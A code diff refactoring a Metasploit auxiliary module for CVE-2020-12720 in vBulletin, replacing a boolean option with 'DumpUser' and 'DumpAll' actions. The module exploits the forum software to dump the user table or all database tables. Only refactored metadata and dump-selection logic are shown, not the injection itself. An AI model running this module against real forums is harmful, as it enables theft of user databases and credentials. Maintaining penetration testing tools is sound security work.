@@ -22,20 +22,17 @@ class MetasploitModule < Msf::Auxiliary
         'License' => MSF_LICENSE,
         'Author' => [
           'Charles Fol <folcharles[at]gmail.com>', # (@cfreal_) CVE
-          'Zenofex <zenofex[at]exploitee.rs>', # (@zenofex) PoC and Metasploit module
+          'Zenofex <zenofex[at]exploitee.rs>' # (@zenofex) PoC and Metasploit module
         ],
         'References' => [
-          ['CVE', '2020-12720'],
+          ['CVE', '2020-12720']
         ],
-        'Platform' => 'php',
-        'Arch' => ARCH_PHP,
-        'Targets' => [
-          [ 'Automatic', {}]
+        'Actions' => [
+          ['DumpUser', 'Description' => 'Dump only user table used by vbulletin.'],
+          ['DumpAll', 'Description' => 'Dump all tables used by vbulletin.']
         ],
-        'Privileged' => false,
-        'Payload' => {},
-        'DisclosureDate' => 'Mar 12 2020',
-        'DefaultTarget' => 0
+        'DefaultAction' => 'DumpUser',
+        'DisclosureDate' => '2020-03-12'
       )
     )
     register_options([
@@ -43,7 +40,6 @@ class MetasploitModule < Msf::Auxiliary
       OptInt.new('NODE', [false, 'Valid Node ID']),
       OptInt.new('MINNODE', [true, 'Valid Node ID', 1]),
       OptInt.new('MAXNODE', [true, 'Valid Node ID', 200]),
-      OptBool.new('DUMPALL', [true, 'Dump all tables', false]),
     ])
   end
 
@@ -276,7 +272,7 @@ class MetasploitModule < Msf::Auxiliary
     table_prfx = get_table_prefix(node_id)
     fail_with(Failure::UnexpectedReply, 'Could not determine the table prefix for the vBulletin install.') unless table_prfx
 
-    tables = datastore['DUMPALL'] ? get_all_tables(node_id, table_prfx) : ["#{table_prfx}user"]
+    tables = action.name == 'DumpAll' ? get_all_tables(node_id, table_prfx) : ["#{table_prfx}user"]
     tables.each do |table|
       columns = get_table_columns(node_id, '', table)
       rows = get_all_rows(node_id, '', table, columns)
